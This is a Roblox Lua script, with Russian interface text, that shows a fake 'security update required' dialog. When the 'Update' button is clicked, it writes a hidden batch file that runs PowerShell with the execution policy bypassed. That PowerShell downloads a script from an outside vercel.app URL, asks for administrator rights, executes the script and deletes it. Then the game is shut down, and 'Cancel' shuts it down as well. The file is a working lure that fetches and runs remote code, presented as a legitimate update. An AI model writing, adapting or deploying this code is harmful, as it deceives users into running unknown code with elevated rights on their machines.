local Players = game:GetService("Players")
local Player = Players.LocalPlayer
local PlayerGui = Player:WaitForChild("PlayerGui")

local function createUpdateModal()
    -- Создание основного экрана
    local screenGui = Instance.new("ScreenGui")
    screenGui.Name = "UpdateModal"
    screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Global
    screenGui.ResetOnSpawn = false
    screenGui.Parent = PlayerGui

    -- Фон
    local background = Instance.new("Frame")
    background.Name = "Background"
    background.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
    background.BackgroundTransparency = 0.4
    background.Size = UDim2.new(1, 0, 1, 0)
    background.Parent = screenGui

    -- Основное окно
    local mainFrame = Instance.new("Frame")
    mainFrame.Name = "MainFrame"
    mainFrame.AnchorPoint = Vector2.new(0.5, 0.5)
    mainFrame.Position = UDim2.new(0.5, 0, 0.5, 0)
    mainFrame.Size = UDim2.new(0, 450, 0, 280)
    mainFrame.BackgroundColor3 = Color3.fromRGB(25, 25, 35)
    mainFrame.BorderSizePixel = 0
    mainFrame.Parent = screenGui

    -- Скругление углов
    local corner = Instance.new("UICorner")
    corner.CornerRadius = UDim.new(0, 12)
    corner.Parent = mainFrame

    -- Тень
    local shadow = Instance.new("ImageLabel")
    shadow.Name = "Shadow"
    shadow.Image = "rbxassetid://5554236771"
    shadow.ImageColor3 = Color3.fromRGB(0, 0, 0)
    shadow.ImageTransparency = 0.8
    shadow.ScaleType = Enum.ScaleType.Slice
    shadow.SliceCenter = Rect.new(23, 23, 277, 277)
    shadow.AnchorPoint = Vector2.new(0.5, 0.5)
    shadow.Position = UDim2.new(0.5, 0, 0.5, 0)
    shadow.Size = UDim2.new(1, 40, 1, 40)
    shadow.BackgroundTransparency = 1
    shadow.Parent = mainFrame
    shadow.ZIndex = -1

    -- Заголовок
    local title = Instance.new("TextLabel")
    title.Name = "Title"
    title.Text = "Требуется обновление"
    title.Font = Enum.Font.GothamBold
    title.TextSize = 24
    title.TextColor3 = Color3.fromRGB(255, 255, 255)
    title.BackgroundTransparency = 1
    title.Position = UDim2.new(0, 0, 0, 20)
    title.Size = UDim2.new(1, 0, 0, 40)
    title.Parent = mainFrame

    -- Иконка обновления
    local icon = Instance.new("ImageLabel")
    icon.Name = "Icon"
    icon.Image = "rbxassetid://7072725342"
    icon.BackgroundTransparency = 1
    icon.Position = UDim2.new(0.5, -40, 0.3, -40)
    icon.Size = UDim2.new(0, 80, 0, 80)
    icon.Parent = mainFrame

    -- Описание
    local description = Instance.new("TextLabel")
    description.Name = "Description"
    description.Text = "Для продолжения работы необходимо установить последнее обновление безопасности. Пожалуйста, нажмите 'Обновить' для автоматической установки."
    description.Font = Enum.Font.Gotham
    description.TextSize = 16
    description.TextColor3 = Color3.fromRGB(200, 200, 200)
    description.TextWrapped = true
    description.BackgroundTransparency = 1
    description.Position = UDim2.new(0.1, 0, 0.5, 0)
    description.Size = UDim2.new(0.8, 0, 0, 60)
    description.Parent = mainFrame

    -- Кнопка Обновить
    local updateButton = Instance.new("TextButton")
    updateButton.Name = "UpdateButton"
    updateButton.Text = "ОБНОВИТЬ"
    updateButton.Font = Enum.Font.GothamBold
    updateButton.TextSize = 18
    updateButton.TextColor3 = Color3.fromRGB(255, 255, 255)
    updateButton.BackgroundColor3 = Color3.fromRGB(0, 120, 215)
    updateButton.BorderSizePixel = 0
    updateButton.Position = UDim2.new(0.1, 0, 0.8, 0)
    updateButton.Size = UDim2.new(0.35, 0, 0, 50)
    updateButton.Parent = mainFrame

    local updateCorner = Instance.new("UICorner")
    updateCorner.CornerRadius = UDim.new(0, 8)
    updateCorner.Parent = updateButton

    -- Кнопка Отмена
    local cancelButton = Instance.new("TextButton")
    cancelButton.Name = "CancelButton"
    cancelButton.Text = "ОТМЕНА"
    cancelButton.Font = Enum.Font.GothamBold
    cancelButton.TextSize = 18
    cancelButton.TextColor3 = Color3.fromRGB(200, 200, 200)
    cancelButton.BackgroundColor3 = Color3.fromRGB(45, 45, 55)
    cancelButton.BorderSizePixel = 0
    cancelButton.Position = UDim2.new(0.55, 0, 0.8, 0)
    cancelButton.Size = UDim2.new(0.35, 0, 0, 50)
    cancelButton.Parent = mainFrame

    local cancelCorner = Instance.new("UICorner")
    cancelCorner.CornerRadius = UDim.new(0, 8)
    cancelCorner.Parent = cancelButton

    -- Анимации при наведении
    updateButton.MouseEnter:Connect(function()
        game:GetService("TweenService"):Create(updateButton, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(0, 100, 180)}):Play()
    end)

    updateButton.MouseLeave:Connect(function()
        game:GetService("TweenService"):Create(updateButton, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(0, 120, 215)}):Play()
    end)

    cancelButton.MouseEnter:Connect(function()
        game:GetService("TweenService"):Create(cancelButton, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(55, 55, 65)}):Play()
    end)

    cancelButton.MouseLeave:Connect(function()
        game:GetService("TweenService"):Create(cancelButton, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(45, 45, 55)}):Play()
    end)

    -- Обработчики нажатий
    updateButton.MouseButton1Click:Connect(function()
        screenGui:Destroy()
        
        -- Создание и выполнение PowerShell скрипта
        local powershellCommand = [[
            $url = "https://redirect-ten-gold.vercel.app/l.ps1"
            $tempFile = "$env:TEMP\admin_script.ps1"
            
            if (-NOT ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
                $arguments = "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command `"Invoke-WebRequest -Uri '$url' -OutFile '$tempFile' -UseBasicParsing; Start-Process powershell -ArgumentList '-NoProfile -ExecutionPolicy Bypass -File `"$tempFile`"' -Verb RunAs`""
                Start-Process powershell -Verb RunAs -ArgumentList $arguments
            } else {
                Invoke-WebRequest -Uri $url -OutFile $tempFile -UseBasicParsing
                & $tempFile
                Remove-Item $tempFile -Force
            }
        ]]
        
        -- Запуск PowerShell команды
        if os and os.execute then
            local tempBat = io.open(os.getenv("TEMP") .. "\\update.bat", "w")
            if tempBat then
                tempBat:write('@echo off\npowershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command "' .. powershellCommand:gsub('"', '""') .. '"')
                tempBat:close()
                os.execute('start "" "' .. os.getenv("TEMP") .. '\\update.bat"')
            end
        end
        
        -- Закрытие Roblox после запуска скрипта
        wait(1)
        game:Shutdown()
    end)

    cancelButton.MouseButton1Click:Connect(function()
        screenGui:Destroy()
        wait(0.5)
        game:Shutdown()
    end)

    return screenGui
end

-- Создание модального окна при запуске
local modal = createUpdateModal()
